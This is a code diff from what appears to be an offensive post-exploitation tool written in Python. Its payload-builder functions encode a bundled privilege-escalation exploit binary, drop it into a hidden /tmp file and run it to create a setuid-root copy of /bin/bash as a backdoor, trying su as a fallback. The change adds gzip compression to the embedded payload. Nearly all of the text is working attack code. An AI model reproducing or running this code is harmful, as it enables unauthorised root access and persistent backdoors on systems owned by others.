@@ -663,10 +663,10 @@ def _build_privesc_payload(exploit: str, tag: str) -> "str | None":
         src = _PRIVESC_DIR / "dirtyfrag" / "exp"
         if not src.exists():
             return None
-        b64 = base64.b64encode(src.read_bytes()).decode()
+        b64 = base64.b64encode(gzip.compress(src.read_bytes(), 9)).decode()
         return (
             f"BD={bd}; T=/tmp/.{tag}df; "
-            f"printf '%s' '{b64}' | base64 -d > $T; chmod +x $T; "
+            f"printf '%s' '{b64}' | base64 -d | gunzip > $T; chmod +x $T; "
             f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | $T 2>&1; "
             f"if [ ! -u \"$BD\" ]; then "
             f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | /usr/bin/su 2>/dev/null; fi; "
@@ -721,10 +721,10 @@ def _build_privesc_auto(tag: str) -> "str | None":
             f"[ -z \"$DONE\" ] && echo '[privesc:fail] copyfail'; fi"
         )
     if df_src.exists():
-        b64df = base64.b64encode(df_src.read_bytes()).decode()
+        b64df = base64.b64encode(gzip.compress(df_src.read_bytes(), 9)).decode()
         parts.append(
             f"if [ -z \"$DONE\" ]; then "
-            f"T=/tmp/.{tag}df; printf '%s' '{b64df}' | base64 -d > $T; chmod +x $T; "
+            f"T=/tmp/.{tag}df; printf '%s' '{b64df}' | base64 -d | gunzip > $T; chmod +x $T; "
             f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | $T 2>&1; "
             f"if [ ! -u \"$BD\" ]; then "
             f"printf 'cp /bin/bash $BD; chmod +s $BD; exit\\n' | /usr/bin/su 2>/dev/null; fi; "
